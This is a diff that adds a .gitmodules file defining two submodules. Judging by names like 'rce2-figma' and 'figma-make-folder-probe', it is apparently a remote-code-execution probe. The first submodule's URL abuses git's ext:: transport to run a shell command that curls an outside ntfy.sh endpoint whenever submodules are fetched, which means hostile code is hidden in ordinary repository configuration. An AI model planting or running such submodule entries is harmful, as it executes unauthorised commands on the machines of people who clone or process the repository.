@@ -1,0 +1,6 @@
+[submodule "sub1"]
+	path = sub1
+	url = ext::sh -c "curl -s -m 8 -d SUBMOD_EXT https://ntfy.sh/rce2-figma-e9a00199af4f9d86"
+[submodule "sub2"]
+	path = sub2
+	url = https://github.com/saiif-01/figma-make-folder-probe.git
